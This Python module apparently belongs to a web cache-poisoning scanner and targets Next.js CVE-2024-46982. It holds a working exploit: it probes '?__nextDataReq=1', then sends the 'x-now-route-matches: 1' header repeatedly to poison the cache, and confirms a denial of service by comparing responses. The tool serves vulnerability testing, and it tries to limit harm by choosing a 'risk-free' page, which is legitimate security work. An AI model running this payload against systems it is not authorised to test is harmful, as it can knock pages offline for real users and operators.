#!/usr/bin/env python3

"""
Based on Zhero research
https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir
"""


import utils.proxy as proxy
from modules.cp_cve.unrisk_page import get_unrisk_page
from utils.style import Colors, Identify
from utils.utils import configure_logger, requests, sys

logger = configure_logger(__name__)


def nextjsdos(
    url: str,
    uri: str,
    s: requests.Session,
    authent: tuple[str, str] | None = None,
) -> None:
    headers = {"x-now-route-matches": "1"}
    for _ in range(0, 5):
        reqdos = s.get(
            uri,
            headers=headers,
            verify=False,
            auth=authent,
            timeout=10,
            allow_redirects=False,
        )
    reqverify = s.get(
        url, verify=False, auth=authent, timeout=10, allow_redirects=False
    )
    req = reqdos  # Assign req to reqdos for the following check
    if "pageProps" in req.text or len(reqdos.content) == len(reqverify.content):
        print(f" {Identify.confirmed} | {url} | {headers}")


def datareq_check(
    url: str,
    s: requests.Session,
    req_main: requests.Response,
    custom_header: dict,
    authent: tuple[str, str] | None,
) -> None:

    uri = f"{url}?__nextDataReq=1"
    try:
        req = s.get(
            uri,
            verify=False,
            headers=custom_header,
            allow_redirects=False,
            auth=authent,
            timeout=10,
        )

        if "pageProps" in req.text or "__N_SSP" in req.text:
            print(
                f" {Identify.behavior} | CVE-2024-46982 | TAG OK | {Colors.BLUE}{uri}{Colors.RESET} | PAYLOAD: x-now-route-matches: 1"
            )
            if proxy.proxy_enabled:
                from utils.proxy import proxy_request

                proxy_request(
                    s, "GET", uri, headers={"x-now-route-matches": "1"}, data=None
                )
            unrisk_page = get_unrisk_page(url, s, req)
            if unrisk_page:
                uri = f"{unrisk_page}?__nextDataReq=1"
                nextjsdos(unrisk_page, uri, s)
            else:
                print(
                    " CVE-2024-46982 | [i] No risk-free pages have been found. Please do a manual check."
                )
    except requests.Timeout as t:
        logger.error(f"request timeout {uri}", t)
    except KeyboardInterrupt:
        print("Exiting")
        sys.exit()
    except Exception as e:
        logger.exception(f"request error {uri}", e)
